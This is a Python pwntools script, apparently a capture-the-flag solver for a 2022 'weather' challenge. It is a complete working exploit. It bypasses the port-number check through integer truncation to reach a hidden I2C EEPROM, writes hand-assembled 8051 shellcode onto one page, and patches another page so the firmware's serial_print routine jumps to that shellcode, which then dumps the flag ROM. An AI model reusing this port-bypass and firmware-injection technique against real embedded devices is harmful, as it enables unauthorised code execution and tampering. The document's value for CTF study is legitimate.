from pwn import * 

FLAGROM_ADR  = 0xEE
FLAGROM_DATA = 0xEF

EEPROM_I2C_PORT = 33

p = remote("weather.2022.ctfcompetition.com", 1337)


def exploit_port(port):
    i = 0
    while True:
        if int('101' + str(i)) % 256 == port:
            return '101' + str(i)
        i += 1

def read_i2c(port : int, reqlen : int) -> bytes():
    command = f'r {exploit_port(port)} {reqlen}'
    b_command = command.encode('utf-8')

    p.readuntil(b'? ')
    p.sendline(b_command)

    b_line : bytes = p.recvline()
    line = b_line.decode('utf-8')

    if 'err' in line:
        raise Exception('Command returned error')
    
    if not 'completed' in line:
        raise Exception('IO operation failed')
    
    b_line = p.recvuntil(b'-end')
    line = b_line.decode('utf-8')

    rdbytes = bytearray()
    for i in line[:-5].split():
        rdbytes.append(int(i))
    return rdbytes
    

def write_i2c(port : int, l_wrbytes : list()):
    wrbytes = str()
    for b in l_wrbytes:
        wrbytes += f'{str(b)} '
    
    command = f'w {exploit_port(port)} {len(l_wrbytes)} {wrbytes}'
    b_command = command.encode('utf-8')

    p.readuntil(b'? ')
    p.sendline(b_command)
    print(command)

def dump_eeprom_page(idx):
    write_i2c(EEPROM_I2C_PORT, [idx])
    print(f'Page {idx}')
    for i, x in enumerate(read_i2c(EEPROM_I2C_PORT, 64)):
        print('{:02x}'.format(int(x)), end=' ')
        if (i + 1) % 8 == 0:
            print()

def dump_eeprom_to_file(path : str):
    with open(path, 'wb') as f:
        for i in range(64):
            equ = '='
            dsh = '-'
            spc = ' '
            print(f'\r[{equ*int(i * 10 / 64)}{dsh*int(10 - (i * 10 / 64))}] {i * 100 / 64}%{spc*5}', end='')

            write_i2c(EEPROM_I2C_PORT, [i])
            f.write(bytes(read_i2c(EEPROM_I2C_PORT, 64)))

def eeprom_clear_page(idx):
    packet = bytearray()
    packet.append(idx)
    packet.append(0xA5)
    packet.append(0x5A)
    packet.append(0xA5)
    packet.append(0x5A)
    for _ in range(64):
        packet.append(0xFF)
    write_i2c(EEPROM_I2C_PORT, packet)

# assumes the target page is all set to 1s
def eeprom_flah_new_page(idx, data):
    packet = bytearray()
    packet.append(idx)
    packet.append(0xA5)
    packet.append(0x5A)
    packet.append(0xA5)
    packet.append(0x5A)
    for i in range(64):
        if i >= len(payload):
            packet.append(0xFF)
        else:
            packet.append(~data[i] & 0xFF)
    write_i2c(EEPROM_I2C_PORT, packet)

def eeprom_write_mask(idx, mask):
    packet = bytearray()
    packet.append(idx)
    packet.append(0xA5)
    packet.append(0x5A)
    packet.append(0xA5)
    packet.append(0x5A)
    for i in range(64):
        if i >= len(mask):
            packet.append(0)
        else:
            packet.append(mask[i])
    write_i2c(EEPROM_I2C_PORT, packet)

def find_existing_i2c_ports():
    print('Existing i2c ports:')
    for i in range(128):
        try:
            print(f'\r\t{i}', end='')
            read_i2c(i, 1)
            print(' X')
        except:
            pass
    print('\r', end='')


# when applied at page 4
# will make serial_print jump to address 0x0C00
p4mask = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, # 100
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, # 110
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xFF, 0xFD, 0xF3, 0xFF, 0x00, # 120
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, # 130
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
]

# Should be put in address 0x0C00 before serial_print is tampered with
payload = [
    0x75, 0xEE, 0x00,
    0x85, 0xEF, 0xF2,
    0x05, 0xEE,
    0xE5, 0xEE,
    0x60, 0x03,
    0x02, 0x0C, 0x03,
    0xE5, 0xF3,
    0x60, 0xFC,
    0x75, 0xF2, 0x0A, 
    0x80, 0xFE
]

def main():
    # find_existing_i2c_ports()
    # for i in range(64):
    #    dump_eeprom_page(i)
    # dump_eeprom_to_file('eeprom')

    print('Delivering payload')
    eeprom_flah_new_page(48, payload)
    dump_eeprom_page(48)
    print('Injecting jump at page 4 to 0xC00')
    eeprom_write_mask(4, p4mask)
    print('waiting for response...')
    print(p.recvline())


if __name__ == "__main__":
    main()